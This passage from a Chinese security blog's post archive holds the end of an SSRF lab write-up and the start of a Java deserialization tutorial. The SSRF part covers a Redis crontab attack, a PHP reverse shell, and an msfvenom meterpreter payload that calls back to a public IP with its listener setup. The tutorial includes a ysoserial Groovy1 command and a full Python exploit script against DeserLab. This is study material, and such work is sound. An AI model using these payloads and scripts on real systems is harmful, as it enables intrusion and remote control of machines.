src="https://s2.loli.net/2022/04/05/jxyQZYrFgVTKb6h.png" alt="image.png"><br>在redis客户端监控中可以看到成功的写入了payload，可是在<code>/etc/crontab</code>中的换行符\r并没有真正的换行。<br>很有可能是对<code>\</code>进行转义了的原因。<br><img src="https://s2.loli.net/2022/04/05/ue96P4iUVBzsy7n.png" alt="image.png"><br>经过实验确实是如此，服务端对我们的特殊字符进行了转义处理。<br>不过没关系，方法总比问题多，我们可以利用文件操作函数加base64编码格式上传木马。给大家一个<a href="https://www.cnblogs.com/-qing-/p/10819069.html">链接</a>可以参考一下。<br>base64编码后应该只存在数字和字母，需要注意一点的是目标服务器上面是否拥有shell运行所需要的模块，比如这里上传包含<code>posix_setsid()</code>的反弹shell马会报错，在文件里面删除这个函数的代码块即可。<br><img src="https://s2.loli.net/2022/04/03/n3PCy8tBD6kAdbp.png" alt="image.png"><br>之后访问该文件，可以看到成功的反弹了shell。</p><h3 id="msfvenom-计划任务反弹shell"><a href="#msfvenom-计划任务反弹shell" class="headerlink" title="msfvenom+计划任务反弹shell"></a>msfvenom+计划任务反弹shell</h3><p>前面我们上传了一个php反弹shell，虽然可以用但是有点简陋并且随时可能被覆盖和删除，所以为了更好的操作我们可以上传一个可执行shell并且定时执行。<br>使用<code>linux/x64/meterpreter/reverse_tcp</code>这个选项来反弹shell。<br><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=42.192.56.33 LPORT=18014 -f elf -o shArp</code>生成一个名为shArp的Linux反弹shell文件。<br>之后咱们就把它上传到靶机上面，先使用<code>scp</code>传输到公网机器上面。<br><code>scp ./shArp user@ip:path</code><br><code>crontab 定时任务文件</code>将任务加入列表中。<br>之后使用<code>msfconsole</code>来利用我们的payload。<br><img src="https://s2.loli.net/2022/04/03/mYKx1j9zNhOWPo8.png" alt="image.png"><br>如何监听可以参考这个<a href="https://www.cnblogs.com/-zhong/p/10916483.html">链接</a><br>大致过程如下：</p><ul><li><code>use multi/handler</code></li><li><code>set payload linux/x64/meterpreter/reverse_tcp</code><ul><li><code>set LHOST 0.0.0.0</code>设置监听地址</li><li><code>set LPORT port</code>设置反向shell连接的端口</li></ul></li><li><code>run</code></li></ul><p><img src="https://s2.loli.net/2022/04/03/RNItDJnfHWTeM6i.png" alt="image.png"><br>成功的反弹了一个shell，如果退出该界面了可以使用<code>sessions id</code>来重新进入到该会话里面。</p><h1 id="172-72-23-30"><a href="#172-72-23-30" class="headerlink" title="172.72.23.30"></a>172.72.23.30</h1><p>开启了mysql服务，也是先验证一下有没有认证。<br>具体的写shell提权方式可以参考<a href="https://www.sqlsec.com/2020/11/mysql.html">国光师傅</a>的博客，写地很详细。<br>当然如果想使用gopher攻击，我们需要知道mysql通信地数据包格式，然后进行构造，也可以直接自己本地请求将包dump掉发送。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> redis未授权 </tag>
            
            <tag> mysql未授权 </tag>
            
            <tag> 常见web漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化</title>
      <link href="/2022/03/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/03/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么会有序列化"><a href="#为什么会有序列化" class="headerlink" title="为什么会有序列化"></a>为什么会有序列化</h1><p>在面向对象的世界中，所有对象的状态信息是不断变化的，为了在不同平台之间更方便的传输和利用这些数据，可以使用序列化将对象格式化然后存储在本地文件系统或者写入网络传输流中，在需要使用该数据时再从磁盘中或网络传输流中取出该数据进行反序列化。</p><p>通常进行反序列化需要以下两个条件：</p><ol><li>该类必须实现了<code>java.io.Serializable</code>或<code>java.io.Externalizable</code>接口。前者完全由自身来控制反序列化的行为，后者可以采用默认的序列化方式。</li><li>该类的所有属性必须是可序列化的，如果有一个属性是不可序列化的，那么必须标明是短暂的。</li></ol><h2 id="相关的类和方法"><a href="#相关的类和方法" class="headerlink" title="相关的类和方法"></a>相关的类和方法</h2><p>在该篇文章中使用Java内置的序列化格式。<br>相关类：<code>java.io.ObjectInputStream</code>与<code>java.io.ObjectOutputStream</code><br>序列化：<code>java.io.ObjectOutputStream</code>类—&gt;&gt;&gt;<code>writeObject()</code><br>该方法将参数指定的obj对象序列化，然后将字节序列写到一个目标输出流(文件或者socket)中，Java标准后缀为<code>.ser</code>的文件<br>反序列化:<code>java.io.ObjectOutputStream</code>类—&gt;&gt;&gt;<code>readObject()</code><br>该方法正好与序列化过程相反。是从一个输入流中读取字节序列，然后将它反序列化为一个对象后返回。<br>需要说明的一点是，序列化之后的格式是多样的，可以是基于文本的，比如JSON或者XML，也可以是二进制格式。<br>Java中有关序列化的函数有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>产生原因：对于类中的对象属性用户可控，在进行序列化的类中重写了<code>readObject</code>方法，并且重写后的方法存在安全隐患。<br>对于方法重写原理是这样的，如果一个反序列化的类没有重写<code>readObject()</code>方法则执行默认的方法，否则执行重写之后的方法。代码体现可以在ObjectInputStream类的<code>readSerialData</code>方法里面找到，会调用<code>slotDesc.hasReadObjectMethod()</code>来看是否重写了该方法。</p><p>要利用反序列化漏洞，需要注意以下两个关键点：</p><ol><li>可以向目标发送我们自己构造的，用来进行反序列化的序列化对象的输入点</li><li>在反序列化过程中可以操控的代码片段</li></ol><h2 id="基础库中的反序列化漏洞"><a href="#基础库中的反序列化漏洞" class="headerlink" title="基础库中的反序列化漏洞"></a>基础库中的反序列化漏洞</h2><p><code>Apache Commons Collections</code>类库中包含许多可以用来进行反序列化的类，常见的有以下几种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">commons-fileupload 1.3.1</span><br><span class="line">commons-io 2.4</span><br><span class="line">commons-collections 3.1</span><br><span class="line">commons-logging 1.2</span><br><span class="line">commons-beanutils 1.9.2</span><br><span class="line">org.slf4j:slf4j-api 1.7.21</span><br><span class="line">com.mchange:mchange-commons-java 0.2.11</span><br><span class="line">org.apache.commons:commons-collections 4.0</span><br><span class="line">com.mchange:c3p0 0.9.5.2</span><br><span class="line">org.beanshell:bsh 2.0b5</span><br><span class="line">org.codehaus.groovy:groovy 2.3.9</span><br><span class="line">org.springframework:spring-aop 4.1.4.RELEASE</span><br></pre></td></tr></table></figure><p>POP(Property-Oriented Programing)翻译过来为面向属性的编程，利用这个来从现有的运行环境中寻找一系列可控的代码片段，然后根据需要来构成一组连续的调用链，这个调用链就叫做POP Gadgets。<br>POP Gadgets特殊的一点是，它利用的是服务器中已经存在的类属性，而不是直接向服务器发送一个类或者代码。这也就造成了该漏洞最难的地方是根据类属性来找出我们可以利用的代码。<br>如果我们能得到源代码的话，那么我们可以查看<code>readObject</code>方法和<code>ObjectInputStream.readObject</code>调用之后的代码，来看看有没有可利用的链。<br>当然，一般情况下我们是不会接触到源代码的，这时我们就可以用到上面描述的基础库来构造POP Gadgets。这种方法，需要知道应用使用了哪些第三方库，然后使用<code>ysoserial</code>生成对应的payload。<br>对于生成的payload，服务器可能返回以下几种结果：</p><ul><li><code>ClassNotFoundException</code>：目标不存在该链所使用的库</li><li><code>java.io.IOException</code>加上<code>Cannot run program</code>信息证明该链成功了，但是目标操作系统上面不可以执行payload指定的命令</li></ul><p>基本库的反序列化链生成机制可以通过调试<a href="https://github.com/frohoff/ysoserial/">ysoserial</a>源码来学习。</p><p>ysoserial的payload产生的结果不会返回，并且由于使用了<code>java.lang.Runtime.exec(String)</code>方法存在以下几种限制：</p><ul><li>不支持shell操作符，比如输出重定向<code>&gt;</code>和管道<code>|</code></li><li>payload命令的参数中不可以包括空格<ul><li>:heavy_check_mark: nc -lp 31313 -e /bin/sh</li><li>:x: perl -e ‘use Socket;…’</li></ul></li></ul><p>这时可以使用网上的工具来消除这些限制，<a href="https://ares-x.com/tools/runtime-exec/">Runtime-exec payload生成</a>。</p><h2 id="漏洞的发现"><a href="#漏洞的发现" class="headerlink" title="漏洞的发现"></a>漏洞的发现</h2><p>知道了反序列化漏洞的原理后，怎么可以分辨是否存在反序列化漏洞呢？</p><p>一种是知道程序的代码，这时我们可以使用白盒审计，搜索用来进行反序列化的函数，确定反序列化输入点，然后再看应用是否使用了上述提到的危险类库，如果存在之后使用ysoserial进行攻击。</p><p>另一种是不知道程序源代码的情况下，也就是黑盒审计，这也是最常见的情况。那么这时我们可以通过抓包查看十六进制数据，来分辨程序是否进行了反序列化，以及是否使用了危险的类库。<br>序列化数据一般以<code>AC ED</code>开始，后面跟上两个字节的版本号，一般为<code>00 05</code>但也可能更高。跟在这4个字节后的是一个或多个<em>内容元素</em>，每个元素的第一个字节取值应该在<code>0x70</code>和<code>07E</code>之间，用来描述元素的类型。<br><code>AC ED 00 05</code>这四个字节只在序列化流的最开始出现一次，所以防范反序列化漏洞时只检测这四个字节是不可行的。如果一个服务器保持一个长连接，那么我们就可以在这四个字节发送完成后，再发送我们的payload。<br>当然这四个字节并不是唯一的特征，我们可以在ASCII格式的数据包中查找Java的类名。<br>在有些情况下，序列化后数据中的Java类名称可能以<em>L</em>开头的替代格式出现，以*;*结尾，并使用正斜杠来分隔命名空间和类名。<br>除了Java类名还有一些其他常见的字符串，比如：表示对象的<code>TC_OBJECT</code>，后跟其类描述<code>TC_CLASSDESC</code>的<code>sr</code>或者表示没有超类<code>TC_NULL</code>的类注解(Annotation)<code>TC_ENDBLOCKDATA</code>结尾的<code>xp</code>。<br>识别出该数据是序列化后的数据，就要定位数据部分的偏移，也就是我们注入payload的部分。</p><p><code>readObject</code>方法会从序列化流中读取以下类型的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x70 - TC_NULL</span><br><span class="line">0x71 - TC_REFERENCE</span><br><span class="line">0x72 - TC_CLASSDESC</span><br><span class="line">0x73 - TC_OBJECT</span><br><span class="line">0x74 - TC_STRING</span><br><span class="line">0x75 - TC_ARRAY</span><br><span class="line">0x76 - TC_CLASS</span><br><span class="line">0x7B - TC_EXCEPTION</span><br><span class="line">0x7C - TC_LONGSTRING</span><br><span class="line">0x7D - TC_PROXYCLASSDESC</span><br><span class="line">0x7E - TC_ENUM</span><br></pre></td></tr></table></figure><p><code>AC ED 00 05</code>后面可能跟如上的数据类型，也可能跟<code>77</code> <code>TC_BLOCKDATA</code> 或<code>7A</code> <code>TC_BLOCKDATALONG</code>类型的块元素。<br>当然序列化后的数据是将对象信息按照一定的规则组合成的，我们可以根据这个规则逆向的推出数据中的数据类型等信息。<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a>工具可以帮我们完成这个过程。<br>该数据结构的更多信息可以参考<a href="https://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html">Oracle 官方文档</a><br>Java序列化格式不止上面一种，还有JSON、XML、YAML等，可以参考这个<a href="https://codegym.cc/groups/posts/217-java-serialization-formats">链接</a></p><h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><p>在最简单的情况下，一个对象是最先从序列化流中被读取的内容，这样我们就可以直接在开头四字节的序列化头部后面插入我们的payload。<br>上面这种情况我们可以通过查看数据包开头五个字节来辨识。如果这五个字节是四个字节的序列化头部<code>0xACED0005</code>跟随着一个字节上面所提到类型的值，那么我们就可以直接构造一个四字节的序列化头部，并在之后插入我们的payload。</p><p>在其他情况下，可能有以下两种可能：</p><ul><li>头部后面跟着<code>TC_BLOCKDATA</code>(0x77)和一个字节的长度字段。该长度标识着后面块数据的字节数。</li><li>头部后面跟着<code>TC_BLOCKDATALONG</code>(0x7A)，后面跟着四字节的长度字段。<br>这种情况下，如果块数据后面跟随着<code>readObject</code>支持的元素类型，那么我们就可以在块数据后面直接插入我们的payload，替换之前的元素类型字节。</li></ul><p>在序列化流中的对象在它们加载进来时就会被实例化，而不是当整个序列化流全被解析后。这个机制使我们在插入payload的同时，不用担心剩下序列化流的结构。</p><h1 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h1><p>为了更好的介绍反序列化漏洞，接下来通过对<a href="https://www.baidu.com/link?url=hPIzQqpMPKd5ylMoQNakGuuzsg2r70j69Bpzb8XFH2Qq6casLp-2GiSJJNl7FYMh&wd=&eqid=ecd04eb1000d3a3d00000003623591f0">DeserLab</a>的攻击，结合其源代码来一步一步的分析反序列化漏洞。<br><code>tcpdump</code> -w将原始的数据包输出到指定文件，host指定接收或发出的主机。</p><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>shell中键入<code>java -jar DeserLab.jar -server 0.0.0.0 9000</code>在本地9000端口开启服务。<br>服务器首先发送hello包来与客户端建立连接，发送<code>PROTOCOL_HELLO</code>给客户端，然后判断客户端返回的hello数据以及客户端版本是否匹配。之后服务器接收客户端的名字输入以及要生成hash的字符串，最后将hash加密后的字符串返回给客户端。</p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p>客户端同样首先也要与服务器发送hello互动，验证成功后便可以发送数据。</p><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>首先我们在不看源代码的情况下来进行分析。<br>客户端与服务器连接发送数据，在这个过程中我们抓包来看看发送的TCP数据包。<br>由于TCP数据包是分段传输的，为了得到完整的数据流，可以对TCP流进行跟踪。<br>在整个过程中，服务器发送了如下的数据，用十六进制表示：</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span>  ac ed <span class="number">00</span> <span class="number">05</span>                                        ....</span><br><span class="line"><span class="number">00000004</span>  <span class="number">77</span> <span class="number">04</span> f0 <span class="number">00</span> ba aa                                  w.....</span><br><span class="line"><span class="number">0000000</span>A  <span class="number">77</span> <span class="number">02</span>                                              w.</span><br><span class="line"><span class="number">0000000</span>C  <span class="number">01</span> <span class="number">01</span>                                              ..</span><br><span class="line"><span class="number">0000000</span>E  <span class="number">73</span> <span class="number">72</span> <span class="number">00</span> <span class="number">14</span> <span class="number">6</span>e <span class="number">62</span> <span class="number">2</span>e <span class="number">64</span>  <span class="number">65</span> <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">2</span>e <span class="number">48</span> <span class="number">61</span> <span class="number">73</span>   sr..nb.d eser.Has</span><br><span class="line"><span class="number">0000001</span>E  <span class="number">68</span> <span class="number">52</span> <span class="number">65</span> <span class="number">71</span> <span class="number">75</span> <span class="number">65</span> <span class="number">73</span> <span class="number">74</span>  e5 <span class="number">2</span>c e9 a9 <span class="number">2</span>a c1 f9 <span class="number">91</span>   hRequest .,..*...</span><br><span class="line"><span class="number">0000002</span>E  <span class="number">02</span> <span class="number">00</span> <span class="number">02</span> <span class="number">4</span>c <span class="number">00</span> <span class="number">0</span>a <span class="number">64</span> <span class="number">61</span>  <span class="number">74</span> <span class="number">61</span> <span class="number">54</span> <span class="number">6f</span> <span class="number">48</span> <span class="number">61</span> <span class="number">73</span> <span class="number">68</span>   ...L..da taToHash</span><br><span class="line"><span class="number">0000003</span>E  <span class="number">74</span> <span class="number">00</span> <span class="number">12</span> <span class="number">4</span>c <span class="number">6</span>a <span class="number">61</span> <span class="number">76</span> <span class="number">61</span>  <span class="number">2f</span> <span class="number">6</span>c <span class="number">61</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">2f</span> <span class="number">53</span> <span class="number">74</span>   t..Ljava /lang/St</span><br><span class="line"><span class="number">0000004</span>E  <span class="number">72</span> <span class="number">69</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">3b</span> <span class="number">4</span>c <span class="number">00</span> <span class="number">07</span>  <span class="number">74</span> <span class="number">68</span> <span class="number">65</span> <span class="number">48</span> <span class="number">61</span> <span class="number">73</span> <span class="number">68</span> <span class="number">71</span>   ring;L.. theHashq</span><br><span class="line"><span class="number">0000005</span>E  <span class="number">00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">01</span>                                        .~..</span><br><span class="line"><span class="number">00000062</span>  <span class="number">78</span> <span class="number">70</span> <span class="number">74</span> <span class="number">00</span> <span class="number">09</span> <span class="number">64</span> <span class="number">61</span> <span class="number">77</span>  <span class="number">64</span> <span class="number">77</span> <span class="number">61</span> <span class="number">64</span> <span class="number">77</span> <span class="number">61</span> <span class="number">74</span> <span class="number">00</span>   xpt..daw dwadw t.</span><br><span class="line"><span class="number">00000072</span>  <span class="number">20</span> <span class="number">66</span> <span class="number">36</span> <span class="number">37</span> <span class="number">65</span> <span class="number">31</span> <span class="number">33</span> <span class="number">37</span>  <span class="number">64</span> <span class="number">66</span> <span class="number">31</span> <span class="number">33</span> <span class="number">64</span> <span class="number">65</span> <span class="number">36</span> <span class="number">36</span>    f67e137 df13de66</span><br><span class="line"><span class="number">00000082</span>  <span class="number">36</span> <span class="number">62</span> <span class="number">39</span> <span class="number">34</span> <span class="number">31</span> <span class="number">32</span> <span class="number">65</span> <span class="number">30</span>  <span class="number">33</span> <span class="number">34</span> <span class="number">66</span> <span class="number">39</span> <span class="number">38</span> <span class="number">35</span> <span class="number">63</span> <span class="number">39</span>   <span class="number">6b</span>9412e0 <span class="number">34f</span>985c9</span><br><span class="line"><span class="number">00000092</span>  <span class="number">30</span>                                                 <span class="number">0</span></span><br></pre></td></tr></table></figure><p>可以看到服务器发送的数据是以<code>ac ed 00 05</code>开头的，这也正是上面我们介绍的，代表序列化数据的开头。<code>77</code>则代表后面跟的是块数据，<code>xp</code>代表块数据的结束。<code>74</code>代表数据类型是String，<code>dawdwadw</code>正是输入的数据，而<code>f</code>开头的字符串是其hash值。<br>好了当我们知道了注入点之后就可以构造payload，使用ysoserial工具。同时由于服务器使用了groovy类库，那么我们就可以利用这个类库产生POP链。<br><code>java -jar ysoserial-master-8eb5cbfbf6-1.jar Groovy1 &quot;mkdir h0cked_8y_sh@rp&quot; &gt; attack.ser</code>将产生的链保存到<code>attack.ser</code><br>由于服务器发送的序列化数据含有特殊的字节，并且客户端也必须发送包含特殊字节的数据包，所以不能简单的直接发送数据，可以参考如下payload：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    DiabloHorn - https://diablohorn.com</span></span><br><span class="line"><span class="string">    References</span></span><br><span class="line"><span class="string">        https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/</span></span><br><span class="line"><span class="string">        https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html</span></span><br><span class="line"><span class="string">        https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html</span></span><br><span class="line"><span class="string">        http://gursevkalra.blogspot.nl/2016/01/ysoserial-commonscollections1-exploit.html</span></span><br><span class="line"><span class="string">        https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</span></span><br><span class="line"><span class="string">        https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478</span></span><br><span class="line"><span class="string">        https://www.youtube.com/watch?v=VviY3O-euVQ</span></span><br><span class="line"><span class="string">        http://wouter.coekaerts.be/2015/annotationinvocationhandler</span></span><br><span class="line"><span class="string">        http://www.baeldung.com/java-dynamic-proxies</span></span><br><span class="line"><span class="string">        https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy</span></span><br><span class="line"><span class="string">        https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">deser</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,tip,tport</span>):</span></span><br><span class="line">        self.targetip = tip</span><br><span class="line">        self.targetport = <span class="built_in">int</span>(tport)</span><br><span class="line">        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.s.connect((self.targetip, self.targetport))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">javaserial</span>(<span class="params">self</span>):</span></span><br><span class="line">        blob = <span class="string">&#x27;\xac\xed\x00\x05&#x27;</span></span><br><span class="line">        self.s.sendall(blob)</span><br><span class="line">        logging.debug(<span class="string">&quot;server javaserial resp: %s&quot;</span> % self.s.recv(<span class="number">4</span>).encode(<span class="string">&#x27;hex&#x27;</span>))    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">protohello</span>(<span class="params">self</span>):</span></span><br><span class="line">        header = self.s.recv(<span class="number">2</span>)</span><br><span class="line">        datalength = <span class="built_in">int</span>(struct.unpack(<span class="string">&#x27;B&#x27;</span>,header[<span class="number">1</span>])[<span class="number">0</span>])</span><br><span class="line">        logging.debug(<span class="string">&quot;server proto hello %s&quot;</span> % self.s.recv(datalength).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        blob = <span class="string">&#x27;\x77\x04&#x27;</span></span><br><span class="line">        blob2 = <span class="string">&#x27;\xf0\x00\xba\xaa&#x27;</span></span><br><span class="line">        self.s.sendall(blob)</span><br><span class="line">        self.s.sendall(blob2)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">protoversion</span>(<span class="params">self</span>):</span></span><br><span class="line">        header = self.s.recv(<span class="number">2</span>)</span><br><span class="line">        datalength = <span class="built_in">int</span>(struct.unpack(<span class="string">&#x27;B&#x27;</span>,header[<span class="number">1</span>])[<span class="number">0</span>])</span><br><span class="line">        logging.debug(<span class="string">&quot;server version %s&quot;</span> % self.s.recv(datalength).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        blob = <span class="string">&#x27;\x77\x02&#x27;</span></span><br><span class="line">        blob2 = <span class="string">&#x27;\x01\x01&#x27;</span></span><br><span class="line">        self.s.sendall(blob)</span><br><span class="line">        self.s.sendall(blob2)</span><br><span class="line">          </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clientname</span>(<span class="params">self</span>):</span></span><br><span class="line">        blob = <span class="string">&#x27;\x77\x09&#x27;</span> <span class="comment">#depends on username + type length</span></span><br><span class="line">        blob2 = <span class="string">&#x27;\x00\x07\x74\x65\x73\x74\x69\x6e\x67&#x27;</span></span><br><span class="line">        self.s.sendall(blob)</span><br><span class="line">        self.s.sendall(blob2)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">self, payload_file</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Normally this is where the HashRequest object is send</span></span><br><span class="line"><span class="string">            instead we send a ysoserial payload, skipping the first 4 bytes</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(payload_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> content_file:</span><br><span class="line">            payload = content_file.read()</span><br><span class="line">        self.s.sendall(payload[<span class="number">4</span>:])</span><br><span class="line">        logging.debug(<span class="string">&#x27;after exploit: %s&#x27;</span> % self.s.recv(<span class="number">1024</span>))</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Exploit for DeserLab&#x27;</span>,epilog=<span class="string">&#x27;https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;targetip&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target ip to exploit&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;targetport&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target port to exploit&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;payloadfile&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;file with the ysoserial payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    myargs = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    logging.debug(<span class="string">&quot;target %s&quot;</span> % myargs.targetip)</span><br><span class="line">    logging.debug(<span class="string">&quot;port %s&quot;</span> % myargs.targetport)</span><br><span class="line">    mydeser = deser(myargs.targetip, myargs.targetport)</span><br><span class="line">    logging.info(<span class="string">&quot;Connecting&quot;</span>)</span><br><span class="line">    mydeser.connect()</span><br><span class="line">    logging.info(<span class="string">&quot;java serialization handshake&quot;</span>)</span><br><span class="line">    mydeser.javaserial()</span><br><span class="line">    logging.info(<span class="string">&quot;protocol specific handshake&quot;</span>)</span><br><span class="line">    mydeser.protohello()</span><br><span class="line">    logging.info(<span class="string">&quot;protocol specific version handshake&quot;</span>)</span><br><span class="line">    mydeser.protoversion()</span><br><span class="line">    logging.info(<span class="string">&quot;sending name of connected client&quot;</span>)</span><br><span class="line">    mydeser.clientname()</span><br><span class="line">    logging.info(<span class="string">&quot;exploiting&quot;</span>)</span><br><span class="line">    mydeser.exploit(myargs.payloadfile)</span><br></pre></td></tr></table></figure><p>然后执行<code>./deserlab.py ip port ./desrlab.bin</code>来进行利用。<br><img src="https://s2.loli.net/2022/03/18/ToP3qtRwdXBSkWj.png" alt="image.png"></p><h2 id="白盒分析"><a 